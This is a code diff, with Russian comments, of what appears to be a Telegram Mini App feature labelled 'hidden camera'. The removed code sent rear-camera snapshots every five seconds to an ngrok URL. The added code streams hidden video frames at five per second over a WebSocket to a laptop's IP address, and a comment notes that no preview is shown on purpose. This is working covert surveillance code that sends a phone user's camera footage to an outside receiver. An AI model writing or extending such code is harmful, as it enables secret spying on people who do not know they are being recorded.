@@ -939,15 +939,20 @@ HTML
 
     // Камера запускается только после нажатия пользователя. Превью намеренно
     // отсутствует; при сворачивании/закрытии Mini App все видео-треки закрываются.
-        // === Скрытая камера ===
+           // === Скрытая камера (WebSocket Live) ===
     let cameraStream = null;
     let videoElement = null;
-    let snapshotInterval = null;
+    let wsConnection = null;
+    let liveInterval = null;
     
-    // ЗАМЕНИТЕ ВАШ_IP НА IP-АДРЕС ВАШЕГО НОУТБУКА (где запущен сервер приемник)
-    const RECEIVER_IP = "https://sip-factor-arbitrate.ngrok-free.dev"; 
-    const RECEIVER_PORT = 8000;
-    const SNAPSHOT_INTERVAL_MS = 5000; // Снимок каждые 5 секунд
+    // ВАЖНО: Это IP-адрес твоего НОУТБУКА в локальной сети (Wi-Fi)
+    // Узнай его: на Windows напечатай в cmd "ipconfig", найди IPv4.
+    // Если телефон и ноутбук в одной Wi-Fi сети, это сработает без ngrok!
+    const LOCAL_IP = "192.168.1.136"; // <-- ЗАМЕНИ НА СВОЙ IP НОУТБУКА
+    const WS_PORT = 8765;
+    const WS_URL = `ws://${LOCAL_IP}:${WS_PORT}`;
+    
+    const FRAME_INTERVAL_MS = 200; // Отправляем кадр каждые 200 мс (5 fps)
     
     async function startHiddenCamera() {
         const status = document.getElementById('cameraStatus');
@@ -958,102 +963,106 @@ HTML
         }
     
         try {
-            // Пытаемся включить заднюю камеру
             const constraints = { 
                 audio: false, 
                 video: { 
-                    width: { ideal: 640 }, 
-                    height: { ideal: 480 },
+                    width: { ideal: 320 }, // Меньшее разрешение для скорости
+                    height: { ideal: 240 },
                     facingMode: "environment" 
                 } 
             };
     
-            if(status) status.textContent = 'Запуск камеры...';
+            if(status) status.textContent = 'Подключение к эфиру...';
             cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
             
-            // Создаем скрытый video элемент
             videoElement = document.createElement('video');
             videoElement.srcObject = cameraStream;
-            videoElement.muted = true; // Важно для автовоспроизведения без звука
+            videoElement.muted = true;
             videoElement.playsInline = true;
-            videoElement.className = 'hidden-camera-video'; // Используем CSS класс из шага 1
-            
-            // Добавляем в DOM и скрываем
+            videoElement.className = 'hidden-camera-video';
             document.body.appendChild(videoElement);
-            videoElement.play();
+            await videoElement.play();
+
+            // Подключаемся к WebSocket серверу на ноутбуке
+            wsConnection = new WebSocket(WS_URL);
             
-            if(status) status.textContent = 'Скрытая камера активна';
+            wsConnection.onopen = () => {
+                console.log('WebSocket подключен');
+                if(status) status.textContent = '🔴 Прямой эфир';
+                
+                // Начинаем отправлять кадры
+                liveInterval = setInterval(sendLiveFrame, FRAME_INTERVAL_MS);
+            };
             
-            // Начинаем отправку снимков
-            startSendingSnapshots();
+            wsConnection.onerror = (err) => {
+                console.error('WS Error', err);
+                if(status) status.textContent = 'Ошибка подключения к ноутбуку';
+            };
             
+            wsConnection.onclose = () => {
+                if(status) status.textContent = 'Связь потеряна. Повторите.';
+                if (liveInterval) clearInterval(liveInterval);
+            };
+
         } catch (err) {
             console.error('Camera error:', err);
             if(status) status.textContent = 'Ошибка камеры: ' + err.message;
         }
     }
     
-        function sendSnapshotBlob() {
-            if (!videoElement || !videoElement.videoWidth) return;
-            
-            const canvas = document.createElement('canvas');
-            canvas.width = videoElement.videoWidth;
-            canvas.height = videoElement.videoHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(videoElement, 0, 0);
-            
-            // Используем toBlob, так как это эффективнее для фото
-            canvas.toBlob(async (blob) => {
-                if (!blob) {
-                    console.error('Blob is null');
-                    return;
-                }
-                
-                const formData = new FormData();
-                // Имя поля должно совпадать с тем, что ожидает Python (например, 'image')
-                formData.append('image', blob, 'snapshot.jpg');
-                
-                try {
-                    // ВАЖНО: Убедись, что здесь твой адрес от ngrok (https://...)
-                    const res = await fetch(`https://sip-factor-arbitrate.ngrok-free.dev/`, {
-                        method: 'POST',
-                        body: formData
-                        // Не указываем Content-Type вручную! Браузер сам поставит boundary для FormData
-                    });
-                    
-                    const result = await res.json();
-                    console.log('Ответ сервера:', result);
-                    
-                } catch (e) {
-                    console.error('Ошибка отправки снимка:', e);
-                }
-            }, 'image/jpeg', 0.7);
-    }
-    
-    function startSendingSnapshots() {
-        if (snapshotInterval) clearInterval(snapshotInterval);
+    // Функция отправки одного кадра
+    function sendLiveFrame() {
+        if (!wsConnection || wsConnection.readyState !== WebSocket.OPEN) return;
+        if (!videoElement || !videoElement.videoWidth) return;
         
-        // Первый снимок сразу
-        sendSnapshotBlob();
+        const canvas = document.createElement('canvas');
+        canvas.width = videoElement.videoWidth;
+        canvas.height = videoElement.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(videoElement, 0, 0);
         
-        // Дальше по таймеру
-        snapshotInterval = setInterval(sendSnapshotBlob, SNAPSHOT_INTERVAL_MS);
+        // Получаем base64 данные
+        canvas.toBlob((blob) => {
+            const reader = new FileReader();
+            reader.onloadend = () => {
+                const base64data = reader.result;
+                // Убираем префикс data:image/jpeg;base64,
+                const pureBase64 = base64data.split(',')[1];
+                
+                if (wsConnection.readyState === WebSocket.OPEN) {
+                    wsConnection.send(pureBase64);
+                }
+            };
+            reader.readAsDataURL(blob);
+        }, 'image/jpeg', 0.5); // Качество 0.5 для скорости
     }
     
     function stopHiddenCamera() {
-        if (snapshotInterval) {
-            clearInterval(snapshotInterval);
-            snapshotInterval = null;
+        if (liveInterval) {
+            clearInterval(liveInterval);
+            liveInterval = null;
         }
+        
+        if (wsConnection) {
+            wsConnection.close();
+            wsConnection = null;
+        }
+        
         if (cameraStream) {
             cameraStream.getTracks().forEach(track => track.stop());
             cameraStream = null;
         }
+        
         if (videoElement) {
             videoElement.remove();
             videoElement = null;
         }
+        
+        const status = document.getElementById('cameraStatus');
+        if(status) status.textContent = 'Камера выключена';
     }
+    
+    
     
         // === Инициализация событий для камеры ===
     
